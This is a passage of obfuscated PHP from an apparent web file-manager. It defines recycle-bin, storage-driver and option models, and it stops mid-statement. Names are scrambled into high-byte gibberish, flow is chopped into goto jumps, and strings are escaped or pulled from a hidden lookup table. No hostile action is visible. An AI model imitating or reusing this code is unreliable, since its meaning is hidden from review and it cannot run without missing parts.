SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\145\137\162\x65\143\171\143\154\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\x69\155\145", "\164\151\155\145", "\151\156\163\145\162\164", "\146\x75\x6e\x63\x74\151\x6f\x6e")); public function listData($eÒ“­±æêá = false) { $eÃ¨¾§¬·§ =& $_SERVER[¢Í]; $eÒ“­±æêá = $eÒ“­±æêá ? $eÒ“­±æêá : USER_ID; $C°Ø˜Ÿ•„¬ = $this->where(array($eÃ¨¾§¬·§[1481] => $eÒ“­±æêá))->select(); return array_to_keyvalue($C°Ø˜Ÿ•„¬, $eÃ¨¾§¬·§[33], $eÃ¨¾§¬·§[394]); } public function moveToRecycle($FŞ¤µ½¹è«) { goto d‡¡Ë×¼è™; d‡¡Ë×¼è™: $eóŸ™–Ï =& $_SERVER[¢Í]; $D‡Ìà¨Š‡± = Model($eóŸ™–Ï[1169]); $F³Ë¬ë´ƒ¹ = $D‡Ìà¨Š‡±->sourceInfo($FŞ¤µ½¹è«); goto fò™Øôˆ²Í; EíĞÃÑÄ¢è: $this->recycleMove($FŞ¤µ½¹è«, 1); if ($F³Ë¬ë´ƒ¹[$eóŸ™–Ï[395]] == $eóŸ™–Ï[93]) { $Cù†ëàÊ”À = array($eóŸ™–Ï[551] => array($eóŸ™–Ï[509], $F³Ë¬ë´ƒ¹[$eóŸ™–Ï[485]] . $FŞ¤µ½¹è« . $eóŸ™–Ï[510])); $D‡Ìà¨Š‡±->where($Cù†ëàÊ”À)->setField($eóŸ™–Ï[422], 1); } goto b‚ˆ‘¦Ğ¨; fò™Øôˆ²Í: if (!$F³Ë¬ë´ƒ¹ || $F³Ë¬ë´ƒ¹[$eóŸ™–Ï[422]] == $eóŸ™–Ï[93]) { return; } $bÕ›÷­²â = array($eóŸ™–Ï[408] => $FŞ¤µ½¹è«, $eóŸ™–Ï[1481] => USER_ID, $eóŸ™–Ï[547] => $F³Ë¬ë´ƒ¹[$eóŸ™–Ï[396]], $eóŸ™–Ï[548] => $F³Ë¬ë´ƒ¹[$eóŸ™–Ï[482]], $eóŸ™–Ï[551] => $F³Ë¬ë´ƒ¹[$eóŸ™–Ï[485]]); $this->add($bÕ›÷­²â); goto EíĞÃÑÄ¢è; b‚ˆ‘¦Ğ¨: } public function clear() { $this->remove(!1); } public function remove($eÅŒŠåÚ‚• = false) { goto eôÛÕØÍïæ; F¨îÛ¯„œ²: $eÅŒŠåÚ‚• = $eÅŒŠåÚ‚• === !1 ? !1 : $eÅŒŠåÚ‚•; $dŸµÓâÒ”İ = array(); foreach ($f”„Å¾‹í· as $Féµà†äÇˆ) { if ($eÅŒŠåÚ‚• != !1 && !in_array($Féµà†äÇˆ, $eÅŒŠåÚ‚•)) { continue; } $aòÕ¨ …Ä = $e›¤Å§‹Ø‚->sourceInfo($Féµà†äÇˆ); $e›¤Å§‹Ø‚->remove($Féµà†äÇˆ, !1); $CªÏÅÑò¨é = $aòÕ¨ …Ä[$B„ó‘âë[396]] . $B„ó‘âë[80] . $aòÕ¨ …Ä[$B„ó‘âë[482]]; $dŸµÓâÒ”İ[$CªÏÅÑò¨é] = array($B„ó‘âë[547] => $aòÕ¨ …Ä[$B„ó‘âë[396]], $B„ó‘âë[482] => $aòÕ¨ …Ä[$B„ó‘âë[482]]); $this->where(array($B„ó‘âë[394] => $Féµà†äÇˆ))->delete(); } goto e‘ÔÅ¨Õ ; e‘ÔÅ¨Õ : foreach ($dŸµÓâÒ”İ as $fĞ”°éùî‘) { $e›¤Å§‹Ø‚->targetSpaceUpdate($fĞ”°éùî‘[$B„ó‘âë[396]], $fĞ”°éùî‘[$B„ó‘âë[482]]); } goto fĞ¼ˆ„; eôÛÕØÍïæ: $B„ó‘âë =& $_SERVER[¢Í]; $e›¤Å§‹Ø‚ = Model($B„ó‘âë[1169]); $f”„Å¾‹í· = $this->listData(); goto F¨îÛ¯„œ²; fĞ¼ˆ„: } public function restore($c‹÷˜Ç‘º = false) { goto b½•ÎõˆÌ÷; D¶ƒ¶ƒÛÕ: $c‹÷˜Ç‘º = $c‹÷˜Ç‘º == !1 ? !1 : $c‹÷˜Ç‘º; if (!$bÁ‘—ù§œ­) { return !0; } $cŠø£óˆ™ç = array(); goto a“–Š´ÁÖß; a“–Š´ÁÖß: foreach ($bÁ‘—ù§œ­ as $Aä¬Ò¡ÉßÀ) { goto C¡¿™‚êŞˆ; DÇØŞ‹Äâ²: $cŠø£óˆ™ç[] = $fõîº±„Í÷[$a¡åå¹Ó°[487]]; if ($fõîº±„Í÷[$a¡åå¹Ó°[395]] == $a¡åå¹Ó°[93]) { $cŠø£óˆ™ç[] = $Aä¬Ò¡ÉßÀ; } $C†éªÀ³‹->lockMoveEnd($Aä¬Ò¡ÉßÀ); goto cÛˆ¦ƒÛí; CÇğ„—ì Î: if ($AˆŞëî’˜‡[$a¡åå¹Ó°[422]] == $a¡åå¹Ó°[93]) { continue; } $C†éªÀ³‹->lockMoveStart($Aä¬Ò¡ÉßÀ); $this->recycleMove($Aä¬Ò¡ÉßÀ, 0); goto f‰›¼õõ›¹; f‰›¼õõ›¹: if ($fõîº±„Í÷[$a¡åå¹Ó°[395]] == $a¡åå¹Ó°[93]) { $BÜŠâ¬Œ…¾ = array($a¡åå¹Ó°[551] => array($a¡åå¹Ó°[509], $fõîº±„Í÷[$a¡åå¹Ó°[485]] . $Aä¬Ò¡ÉßÀ . $a¡åå¹Ó°[510])); $C†éªÀ³‹->where($BÜŠâ¬Œ…¾)->setField($a¡åå¹Ó°[422], 0); $this->restoreFolderChildren($Aä¬Ò¡ÉßÀ, $bÁ‘—ù§œ­); } $this->where(array($a¡åå¹Ó°[394] => $Aä¬Ò¡ÉßÀ))->delete(); $C†éªÀ³‹->folderSizeReset($fõîº±„Í÷[$a¡åå¹Ó°[487]]); goto DÇØŞ‹Äâ²; C¡¿™‚êŞˆ: if ($c‹÷˜Ç‘º != !1 && !in_array($Aä¬Ò¡ÉßÀ, $c‹÷˜Ç‘º)) { continue; } $fõîº±„Í÷ = $C†éªÀ³‹->sourceInfo($Aä¬Ò¡ÉßÀ); $AˆŞëî’˜‡ = $C†éªÀ³‹->sourceInfo($fõîº±„Í÷[$a¡åå¹Ó°[487]]); goto CÇğ„—ì Î; cÛˆ¦ƒÛí: } $C†éªÀ³‹->updateModifyTime($cŠø£óˆ™ç); goto A¦Ø½ï³±á; b½•ÎõˆÌ÷: $a¡åå¹Ó° =& $_SERVER[¢Í]; $C†éªÀ³‹ = Model($a¡åå¹Ó°[1169]); $bÁ‘—ù§œ­ = $this->listData(); goto D¶ƒ¶ƒÛÕ; A¦Ø½ï³±á: } private function restoreFolderChildren($Bªœéá‘Ã², $aº‰‰Ú¯²Š) { goto EƒÙôŒ·Œ‚; BÆˆ­õ™ß: foreach ($aº‰‰Ú¯²Š as $DİÙŸÖ¥Ø¶) { if ($DİÙŸÖ¥Ø¶ == $Bªœéá‘Ã²) { continue; } if (!$CñâóŠÂâŸ->isParentOf($Bªœéá‘Ã², $DİÙŸÖ¥Ø¶)) { continue; } $e¹ë‰¯‘ÃĞ = $CñâóŠÂâŸ->sourceInfo($DİÙŸÖ¥Ø¶); if ($e¹ë‰¯‘ÃĞ[$f¡Ö¨ñ£âà[395]] == $f¡Ö¨ñ£âà[93]) { $Få›–ÄöÂ[] = array($f¡Ö¨ñ£âà[551] => array($f¡Ö¨ñ£âà[509], $e¹ë‰¯‘ÃĞ[$f¡Ö¨ñ£âà[485]] . $DİÙŸÖ¥Ø¶ . $f¡Ö¨ñ£âà[510])); } else { $Få›–ÄöÂ[$f¡Ö¨ñ£âà[394]][1][] = $DİÙŸÖ¥Ø¶; } } if (!$Få›–ÄöÂ[$f¡Ö¨ñ£âà[394]][1]) { unset($Få›–ÄöÂ[$f¡Ö¨ñ£âà[394]]); } if (!$Få›–ÄöÂ) { return; } goto BÌÀÃ¼ñ³š; EƒÙôŒ·Œ‚: $f¡Ö¨ñ£âà =& $_SERVER[¢Í]; $CñâóŠÂâŸ = Model($f¡Ö¨ñ£âà[1169]); $Få›–ÄöÂ = array($f¡Ö¨ñ£âà[394] => array($f¡Ö¨ñ£âà[7], array())); goto BÆˆ­õ™ß; BÌÀÃ¼ñ³š: $Få›–ÄöÂ[$f¡Ö¨ñ£âà[394]][1] = array_unique($Få›–ÄöÂ[$f¡Ö¨ñ£âà[394]][1]); $Få›–ÄöÂ[$f¡Ö¨ñ£âà[925]] = $f¡Ö¨ñ£âà[1737]; $CñâóŠÂâŸ->where($Få›–ÄöÂ)->setField($f¡Ö¨ñ£âà[422], 1); goto e¶íÊõê¥¾; e¶íÊõê¥¾: } private function recycleMove($D“öšÚ¼å¿, $EÈ¬·ª©Ã = 1) { $A¶’¶“ ó´ =& $_SERVER[¢Í]; $aÖöšÔ”ŞÊ = Model($A¶’¶“ ó´[1169]); $A°‚Å¦±“Ã = Model($A¶’¶“ ó´[1943]); $F½¶«‡Œô = array($A¶’¶“ ó´[394] => $D“öšÚ¼å¿); if ($EÈ¬·ª©Ã) { $aÖöšÔ”ŞÊ->where($F½¶«‡Œô)->setField($A¶’¶“ ó´[422], 1); $A°‚Å¦±“Ã->eventRecycle($D“öšÚ¼å¿, $A¶’¶“ ó´[1944]); } else { $f«ªÁËÍ‚ = $aÖöšÔ”ŞÊ->where($F½¶«‡Œô)->find(); $b¤ óÕÙÛÎ = $f«ªÁËÍ‚[$A¶’¶“ ó´[395]] == $A¶’¶“ ó´[93]; $f„ø©¯ìƒ» = $aÖöšÔ”ŞÊ->fileNameAuto($f«ªÁËÍ‚[$A¶’¶“ ó´[487]], $f«ªÁËÍ‚[$A¶’¶“ ó´[28]], REPEAT_RENAME_FOLDER, $b¤ óÕÙÛÎ); if ($f„ø©¯ìƒ» != $f«ªÁËÍ‚[$A¶’¶“ ó´[28]]) { $aÖöšÔ”ŞÊ->rename($D“öšÚ¼å¿, $f„ø©¯ìƒ»); } $aÖöšÔ”ŞÊ->where($F½¶«‡Œô)->setField($A¶’¶“ ó´[422], 0); $A°‚Å¦±“Ã->eventRecycle($D“öšÚ¼å¿, $A¶’¶“ ó´[1945]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x73\x74\x6f\162\141\147\145\114\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\x69\172\145\115\x61\170", "\163\x79\x73\164\x65\155", "\144\x65\x66\x61\165\154\164", "\144\162\151\166\145\162", "\x63\157\156\146\151\147"); public function listData($cÊ´¯–ÒŠ = false, $a±ÏïÂ…¬ƒ = "\155\x6f\x64\x69\x66\171\x54\x69\x6d\145", $Dã“°ˆ´Ï¿ = false) { goto BØ«ÍóÏ×; BØ«ÍóÏ×: $EŠ§Ô‹ÌÏ„ =& $_SERVER[¢Í]; $e©¹¦ËÊ = parent::listData($cÊ´¯–ÒŠ, $a±ÏïÂ…¬ƒ, $Dã“°ˆ´Ï¿); if ($cÊ´¯–ÒŠ) { return $e©¹¦ËÊ; } goto aàÊ…Û²Ç¿; aàÊ…Û²Ç¿: foreach ($e©¹¦ËÊ as $e¦èà÷Ï­ => $F±çòïçœâ) { unset($e©¹¦ËÊ[$e¦èà÷Ï­][$EŠ§Ô‹ÌÏ„[6]]); $e©¹¦ËÊ[$e¦èà÷Ï­][$EŠ§Ô‹ÌÏ„[1634]] = 0; } $A«‰À‚µ‹ = array_to_keyvalue($e©¹¦ËÊ, $EŠ§Ô‹ÌÏ„[33], $EŠ§Ô‹ÌÏ„[392]); $this->_listAppendSize($e©¹¦ËÊ, $A«‰À‚µ‹); goto aŒ±Éƒ‹‚—; aŒ±Éƒ‹‚—: return $e©¹¦ËÊ; goto aÕíÆïäî; aÕíÆïäî: } public function _listAppendSize(&$FÎÃŞáÑ¬İ, $dÅ²Ô±ªÅ¨) { $fàÃù–ä =& $_SERVER[¢Í]; if (!$dÅ²Ô±ªÅ¨) { return; } $A¤ÕåŸë¸ = $fàÃù–ä[1946] . implode($fàÃù–ä[47], $dÅ²Ô±ªÅ¨) . $fàÃù–ä[1947]; $añÔÎé¾“Â = Model($fàÃù–ä[732])->query($A¤ÕåŸë¸); $añÔÎé¾“Â = array_to_keyvalue($añÔÎé¾“Â, $fàÃù–ä[392], $fàÃù–ä[87]); foreach ($FÎÃŞáÑ¬İ as $aÔŸ‹Æäœ° => $eŠµßíµÇ) { $FÎÃŞáÑ¬İ[$aÔŸ‹Æäœ°][$fàÃù–ä[1634]] = isset($añÔÎé¾“Â[$eŠµßíµÇ[$fàÃù–ä[392]]]) ? $añÔÎé¾“Â[$eŠµßíµÇ[$fàÃù–ä[392]]] : 0; } } public function getConfig($DÈ‘„©ÏéÂ) { $F¼ÔÒš­õ = parent::listData($DÈ‘„©ÏéÂ); return json_decode($F¼ÔÒš­õ[$_SERVER[¢Í][6]], !0); } public function update($D±©æ³È•, $e–«ùÒÎ¢„) { goto c³ª­Ğö«„; e÷‘ğéã§: $bØ»„‡‹¡ = parent::update($D±©æ³È•, $e–«ùÒÎ¢„); if ($bØ»„‡‹¡ && $e–«ùÒÎ¢„[$fŸ²º¤©É[34]]) { foreach ($eÍ÷Îîß›ß as $c™‰Ü´¾¿) { if ($c™‰Ü´¾¿[$fŸ²º¤©É[34]] && $c™‰Ü´¾¿[$fŸ²º¤©É[392]] != $D±©æ³È•) { parent::update($c™‰Ü´¾¿[$fŸ²º¤©É[392]], array($fŸ²º¤©É[34] => 0)); } } } return $bØ»„‡‹¡; goto c¼º÷¤äêÖ; a·ì­¢©–™: if (isset($eÍ÷Îîß›ß[$fÑä‰ö«‰İ]) && $eÍ÷Îîß›ß[$fÑä‰ö«‰İ][$fŸ²º¤©É[392]] != $D±©æ³È•) { return !1; } if (isset($e–«ùÒÎ¢„[$fŸ²º¤©É[1948]]) && $e–«ùÒÎ¢„[$fŸ²º¤©É[1948]] == $fŸ²º¤©É[93]) { $this->checkConfig($e–«ùÒÎ¢„); } unset($e–«ùÒÎ¢„[$fŸ²º¤©É[1948]]); goto e÷‘ğéã§; c³ª­Ğö«„: $fŸ²º¤©É =& $_SERVER[¢Í]; $fÑä‰ö«‰İ = $e–«ùÒÎ¢„[$fŸ²º¤©É[28]]; $eÍ÷Îîß›ß = array_to_keyvalue(parent::listData(), $fŸ²º¤©É[28]); goto a·ì­¢©–™; c¼º÷¤äêÖ: } public function add($DİŒ¦˜Î·) { goto DÉîí†—ˆÅ; F’•ÖÊß¬ˆ: return $BÒ†„åŠù; goto cóß¼Û ãò; fôéå·»¿ƒ: $this->checkConfig($DİŒ¦˜Î·); $BÒ†„åŠù = parent::insert($DİŒ¦˜Î·); if ($BÒ†„åŠù && $DİŒ¦˜Î·[$A“¡Ä†•ª[34]]) { foreach ($CÄË—Ş” as $a·â²“†¡) { if ($a·â²“†¡[$A“¡Ä†•ª[34]]) { parent::update($a·â²“†¡[$A“¡Ä†•ª[392]], array($A“¡Ä†•ª[34] => 0)); } } } goto F’•ÖÊß¬ˆ; DÉîí†—ˆÅ: $A“¡Ä†•ª =& $_SERVER[¢Í]; $CÄË—Ş” = array_to_keyvalue(parent::listData(), $A“¡Ä†•ª[28]); if (isset($CÄË—Ş”[$DİŒ¦˜Î·[$A“¡Ä†•ª[28]]])) { return !1; } goto fôéå·»¿ƒ; cóß¼Û ãò: } public function checkConfig(&$DÄØì÷§Ğ») { goto CŒà©Í¨Ù§; cä½««ˆ‡Æ: $f‚®³Ù­ó = $e£ô¿Š¨´->getPath($DõøãàÁ†¿ . $E¡ãÀãˆ›[1103]); if (!$e£ô¿Š¨´->mkfile($f‚®³Ù­ó)) { show_json(LNG($E¡ãÀãˆ›[1953]), !1); } $c—£¨„Ï„é[$E¡ãÀãˆ›[1043]] = $DõøãàÁ†¿; goto cÀ¹í£Âç®; D‹‡˜Ô¤˜é: foreach ($c—£¨„Ï„é as $Dğª¼´ÔÉ¸ => $C‰ì¡• å) { $c—£¨„Ï„é[$Dğª¼´ÔÉ¸] = trim($C‰ì¡• å); } $c—£¨„Ï„é[$E¡ãÀãˆ›[1949]] = rand_string(6); $aÔ•š£±õ¼ = $GLOBALS[$E¡ãÀãˆ›[6]][$E¡ãÀãˆ›[94]][$E¡ãÀãˆ›[766]]; goto e–…Ë†Ğ»é; e–…Ë†Ğ»é: $BŠº†ƒËã¬ = isset($aÔ•š£±õ¼[$e“‰¦¸ÏÁ]) ? $aÔ•š£±õ¼[$e“‰¦¸ÏÁ] : ucfirst($e“‰¦¸ÏÁ); $Fà°ïó¢âŠ = $E¡ãÀãˆ›[81] . $BŠº†ƒËã¬; if (!$BŠº†ƒËã¬ || !class_exists($Fà°ïó¢âŠ)) { write_log(array($E¡ãÀãˆ›[1950], $DÄØì÷§Ğ», get_caller_info()), $E¡ãÀãˆ›[1951]); show_json(LNG($E¡ãÀãˆ›[1952]), !1, $DÄØì÷§Ğ»); } goto B—°Ã“±´‡; B—°Ã“±´‡: $e£ô¿Š¨´ = new $Fà°ïó¢âŠ($c—£¨„Ï„é); if (in_array($e“‰¦¸ÏÁ, $e£ô¿Š¨´->objectDriver)) { if (!$e£ô¿Š¨´->isBucketCors() && !$e£ô¿Š¨´->setBucketCors()) { $Bâ¦’•îéä = LNG($E¡ãÀãˆ›[1953]); $Bâ¦’•îéä .= $E¡ãÀãˆ›[1954] . LNG($E¡ãÀãˆ›[1955]); show_json($Bâ¦’•îéä, !1); } } $DõøãàÁ†¿ = rtrim($c—£¨„Ï„é[$E¡ãÀãˆ›[1043]], $E¡ãÀãˆ›[8]) . $E¡ãÀãˆ›[8]; goto cä½««ˆ‡Æ; CŒà©Í¨Ù§: $E¡ãÀãˆ› =& $_SERVER[¢Í]; $e“‰¦¸ÏÁ = strtolower($DÄØì÷§Ğ»[$E¡ãÀãˆ›[100]]); $c—£¨„Ï„é = json_decode($DÄØì÷§Ğ»[$E¡ãÀãˆ›[6]], !0); goto D‹‡˜Ô¤˜é; cÀ¹í£Âç®: $DÄØì÷§Ğ»[$E¡ãÀãˆ›[6]] = json_encode($c—£¨„Ï„é); $DÄØì÷§Ğ»[$E¡ãÀãˆ›[100]] = $BŠº†ƒËã¬; return !0; goto dñ”Óƒì…‘; dñ”Óƒì…‘: } public function driverListSystem() { $Cô’ùµÚß =& $_SERVER[¢Í]; $B‚Æ¼ÉÜã¶ = parent::listData(); $BöÓ– ••Ì = array(); foreach ($B‚Æ¼ÉÜã¶ as $BÇ…·¶ø¿) { unset($BÇ…·¶ø¿[$Cô’ùµÚß[200]], $BÇ…·¶ø¿[$Cô’ùµÚß[117]]); $BÇ…·¶ø¿[$Cô’ùµÚß[6]] = json_decode($BÇ…·¶ø¿[$Cô’ùµÚß[6]], !0); $BöÓ– ••Ì[] = $BÇ…·¶ø¿; } return $BöÓ– ••Ì; } public function defaultDriver() { $f—×è£ †à =& $_SERVER[¢Í]; $bè™Ş‰´« = parent::listData(); $CÌŸÆ¨Æ = array_filter_by_field($bè™Ş‰´«, $f—×è£ †à[34], 1); $CÌŸÆ¨Æ = $CÌŸÆ¨Æ[0]; if ($CÌŸÆ¨Æ) { $CÌŸÆ¨Æ[$f—×è£ †à[6]] = json_decode($CÌŸÆ¨Æ[$f—×è£ †à[6]], !0); } return $CÌŸÆ¨Æ; } public function driverInfo($A›êÁ¦Ø†‰) { $cá‹µÊ¼ =& $_SERVER[¢Í]; $dåÛƒ°‡Á… = array_to_keyvalue(parent::listData(), $cá‹µÊ¼[392]); if (!isset($dåÛƒ°‡Á…[$A›êÁ¦Ø†‰])) { return !1; } $b¯›ã†“Ó = $dåÛƒ°‡Á…[$A›êÁ¦Ø†‰]; $b¯›ã†“Ó[$cá‹µÊ¼[6]] = json_decode($b¯›ã†“Ó[$cá‹µÊ¼[6]], !0); return $b¯›ã†“Ó; } public function remove($aÃÏÅ†Úô¿) { $this->removeShareItems($aÃÏÅ†Úô¿); return parent::remove($aÃÏÅ†Úô¿); } public function removeWithFile($cº ãÅ¹´, $Dˆ¤‹ìÙš¨) { goto dî¬Ç™‘Üë; dî¬Ç™‘Üë: $f¿âó­á¤‹ =& $_SERVER[¢Í]; $EğŠ·¸İ = array($f¿âó­á¤‹[757] => $cº ãÅ¹´); $DˆÄß¥»Û = Model($f¿âó­á¤‹[447])->where($EğŠ·¸İ)->count(); goto Cø«Æïù†Ø; c¯šÌµç‚é: $c„Ó•“‰ = Model($f¿âó­á¤‹[181])->where($EğŠ·¸İ)->field($f¿âó­á¤‹[1958])->select(); foreach ($c„Ó•“‰ as $Cëõãõïó) { goto E‹ËäÑ³‚; E‹ËäÑ³‚: $Fõ÷¨èÛ¢’ = $Cëõãõïó[$f¿âó­á¤‹[85]]; $aµç¥ß÷‘„ = $eË¢õ­•Î . str_replace("\173\x69\157\x3a{$cº ãÅ¹´}\x7d\x2f", $f¿âó­á¤‹[33], $Fõ÷¨èÛ¢’); if (!IO::exist($Fõ÷¨èÛ¢’)) { $aÅ²…†²™Š[] = $Cëõãõïó[$f¿âó­á¤‹[444]]; $F²‘ˆ‚ÔíÙ->updateFileEnd($Cëõãõïó[$f¿âó­á¤‹[28]], $Cëõãõïó[$f¿âó­á¤‹[87]]); continue; } goto Fİİô–¾Àƒ; Fİİô–¾Àƒ: if (IO::exist($aµç¥ß÷‘„)) { $F²‘ˆ‚ÔíÙ->updateFileEnd($Cëõãõïó[$f¿âó­á¤‹[28]], $Cëõãõïó[$f¿âó­á¤‹[87]]); continue; } if (!IO::move($Fõ÷¨èÛ¢’, get_path_father($aµç¥ß÷‘„))) { $FŒ˜…«… = !1; break; } $EğŠ·¸İ = array($f¿âó­á¤‹[444] => $Cëõãõïó[$f¿âó­á¤‹[444]]); goto B‹ˆ™ÁÌ®”; B‹ˆ™ÁÌ®”: $f”î ¿¬ª = array($f¿âó­á¤‹[757] => $e—ƒÅäœÁö, $f¿âó­á¤‹[85] => $aµç¥ß÷‘„); Model($f¿âó­á¤‹[181])->where($EğŠ·¸İ)->save($f”î ¿¬ª); goto b¬¸¨ óŞ‹; b¬¸¨ óŞ‹: } $this->removeByFileID($aÅ²…†²™Š); goto C†š¿Ò„Ë†; aê’ÒÎÏÙÖ: $F²‘ˆ‚ÔíÙ->task[$f¿âó­á¤‹[712]] = (double) $b˜‹—«¯ÃÖ; $c¥ç´æµ¢œ = KodIO::defaultDriver(); $e—ƒÅäœÁö = $c¥ç´æµ¢œ[$f¿âó­á¤‹[392]]; goto E¦ÓºÕ³Ï; Cø«Æïù†Ø: $b˜‹—«¯ÃÖ = Model($f¿âó­á¤‹[447])->where($EğŠ·¸İ)->sum($f¿âó­á¤‹[87]); $Fİ•‰éŸß¢ = $Dˆ¤‹ìÙš¨ . $f¿âó­á¤‹[1956] . $cº ãÅ¹´; $F²‘ˆ‚ÔíÙ = new TaskFileTransfer($Fİ•‰éŸß¢, $f¿âó­á¤‹[1951], $DˆÄß¥»Û, LNG($f¿âó­á¤‹[1957]) . "\50{$cº ãÅ¹´}\51"); goto aê’ÒÎÏÙÖ; E¦ÓºÕ³Ï: $eË¢õ­•Î = "\x7b\x69\157\x3a{$e—ƒÅäœÁö}\x7d\x2f"; $FŒ˜…«… = !0; $aÅ²…†²™Š = array(); goto c¯šÌµç‚é; C†š¿Ò„Ë†: if (!$FŒ˜…«…) { $F²‘ˆ‚ÔíÙ->stop($Fİ•‰éŸß¢); return !1; } $F²‘ˆ‚ÔíÙ->end(); if ($Dˆ¤‹ìÙš¨ == $f¿âó­á¤‹[1614]) { $this->remove($cº ãÅ¹´); } goto C³İ•éç„; C³İ•éç„: } public function progress($e£ øòŠ‡¾, $aóß„¼ò ½) { return Task::get($aóß„¼ò ½ . $_SERVER[¢Í][1956] . $e£ øòŠ‡¾); } private function removeByFileID($CÊìŠŒ˜é– = array()) { goto Aâ‚Ã¡‘ÜÊ; c…„‘ƒàÍ: $a³©ƒ©ÚŒ« = Model($bƒÃ‚êæß²[1169])->where($f¥¦ïìƒ)->field($bƒÃ‚êæß²[394])->select(); if (!$a³©ƒ©ÚŒ«) { return; } $a³©ƒ©ÚŒ« = array_to_keyvalue($a³©ƒ©ÚŒ«, $bƒÃ‚êæß²[33], $bƒÃ‚êæß²[394]); goto b‘ÅµìÍè; Aâ‚Ã¡‘ÜÊ: $bƒÃ‚êæß² =& $_SERVER[¢Í]; if (empty($CÊìŠŒ˜é–)) { return; } $f¥¦ïìƒ = array($bƒÃ‚êæß²[444] => array($bƒÃ‚êæß²[7], $CÊìŠŒ˜é–)); goto c…„‘ƒàÍ; b‘ÅµìÍè: foreach ($a³©ƒ©ÚŒ« as $D¿’ë‡‡í«) { Model($bƒÃ‚êæß²[407])->removeNow($D¿’ë‡‡í«, !1); } goto e¶ÎŞ†Œ¢ï; e¶ÎŞ†Œ¢ï: } private function removeShareItems($còé‡Ñ×‡) { goto FÎÅ¼ìÄÜø; a¶›Ö„øÔ°: Model($BÛÁÃÛ‘ò[561])->remove($DİçöÕ¡ÌŒ); goto b„¯×ïÔ–ì; FÎÅ¼ìÄÜø: $BÛÁÃÛ‘ò =& $_SERVER[¢Í]; $AÌ¾ËèÕÑè = "\x7b\151\157\x3a{$còé‡Ñ×‡}\x7d\x2f"; $fŞ±Õùè‡ƒ = array($BÛÁÃÛ‘ò[394] => 0, $BÛÁÃÛ‘ò[1038] => array($BÛÁÃÛ‘ò[382], "{$AÌ¾ËèÕÑè}\x25")); goto Aè£ö£÷…; Aè£ö£÷…: $BÁ†À‰„é™ = Model($BÛÁÃÛ‘ò[1625])->where($fŞ±Õùè‡ƒ)->field($BÛÁÃÛ‘ò[465])->select(); if (empty($BÁ†À‰„é™)) { return; } $DİçöÕ¡ÌŒ = array_to_keyvalue($BÁ†À‰„é™, $BÛÁÃÛ‘ò[33], $BÛÁÃÛ‘ò[465]); goto a¶›Ö„øÔ°; b„¯×ïÔ–ì: } } goto d¦·”¤«“; F¡ªÅ‹—•ñ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($B¡‘‚¶£ï = false, $FÄƒñ»‹ = '', $dƒìÇˆô®´ = false) { goto eÛ¶Ö®ö£í; E¥Úñ„Şà½: $F½®Ó’·î = is_array($F½®Ó’·î) ? $F½®Ó’·î : array(); if (is_array($d¸ˆòìŸ¾…)) { $d¸ˆòìŸ¾… = array_merge($F½®Ó’·î, $d¸ˆòìŸ¾…); return $B¡‘‚¶£ï ? isset($d¸ˆòìŸ¾…[$B¡‘‚¶£ï]) ? $d¸ˆòìŸ¾…[$B¡‘‚¶£ï] : null : $d¸ˆòìŸ¾…; } $EÎ†Ô‰—°¶ = $this->filterWhere(array($fóÏà‚ñô»[29] => $FÄƒñ»‹)); goto AëÕí“âî; eÛ¶Ö®ö£í: $fóÏà‚ñô» =& $_SERVER[¢Í]; $d¸ˆòìŸ¾… = $this->cacheGet($FÄƒñ»‹); $F½®Ó’·î = $this->optionDefault($FÄƒñ»‹); goto E¥Úñ„Şà½; AëÕí“âî: $d¸ˆòìŸ¾… = $this->where($EÎ†Ô‰—°¶)->select(); $d¸ˆòìŸ¾… = array_to_keyvalue($d¸ˆòìŸ¾…, $fóÏà‚ñô»[99], $fóÏà‚ñô»[375]); foreach ($d¸ˆòìŸ¾… as $D‰ˆ¾ä¯ç => $b‰«‹¤²„) { if ($dƒìÇˆô®´ || in_array($D‰ˆ¾ä¯ç, $this->jsonField)) { $d¸ˆòìŸ¾…[$D‰ˆ¾ä¯ç] = json_decode($b‰«‹¤²„, !0); } } goto E ŞÒƒøĞÒ; E ŞÒƒøĞÒ: $this->cacheSet($FÄƒñ»‹, $d¸ˆòìŸ¾…); $d¸ˆòìŸ¾… = array_merge($F½®Ó’·î, $d¸ˆòìŸ¾…); return $B¡‘‚¶£ï ? $d¸ˆòìŸ¾…[$B¡‘‚¶£ï] : $d¸ˆòìŸ¾…; goto CÉòºÊà; CÉòºÊà: } public function set($fÁòµí† , $FÜ¾®ñÚ„Ï = false, $bà”É¸§¬Œ = '') { goto eÂ¼Ú‡ãª; eÂ¼Ú‡ãª: $DµŠ¼ğˆŸë =& $_SERVER[¢Í]; $this->cacheRemove($bà”É¸§¬Œ); $CÄ©½ŒŸ¡ = array(); goto cŠ¿ä‹ÒÚÈ; C—÷œ¸©³: return $this->addAll($CÄ©½ŒŸ¡, array(), !0); goto E›•Ë¯‚šŠ; cŠ¿ä‹ÒÚÈ: $C¿¢Î¦äİ• = is_array($fÁòµí† ) ? $fÁòµí†  : array($fÁòµí†  => $FÜ¾®ñÚ„Ï); foreach ($C¿¢Î¦äİ• as $d‘äÕğ¨¢í => $bÓÜ¼šä¸­) { if (is_array($bÓÜ¼šä¸­)) { $bÓÜ¼šä¸­ = json_encode_force($bÓÜ¼šä¸­); } $this->checkLength($bÓÜ¼šä¸­, !1, $this->tableName . $DµŠ¼ğˆŸë[4] . $fÁòµí† ); $bÓÜ¼šä¸­ = self::textEncode($bÓÜ¼šä¸­); $C¿¢Î¦äİ• = array($DµŠ¼ğˆŸë[29] => $bà”É¸§¬Œ, $DµŠ¼ğˆŸë[99] => $d‘äÕğ¨¢í, $DµŠ¼ğˆŸë[375] => $bÓÜ¼šä¸­); $CÄ©½ŒŸ¡[] = $this->filterWhere($C¿¢Î¦äİ•); } if (!$CÄ©½ŒŸ¡) { return !0; } goto C—÷œ¸©³; E›•Ë¯‚šŠ: } protected function optionDefault($BÎÇØˆ’ö¢ = '') { return !1; } public function setDeep($B¯¡Ø‚ßéâ, $B‡ˆ¿¥âÓ = false, $c‡éƒ¾Üë¹ = '') { $a•‰„ƒ¿š = explode($_SERVER[¢Í][101], $B¯¡Ø‚ßéâ); $A¡Ü¡é•¨© = $this->get(); array_set_value($A¡Ü¡é•¨©, 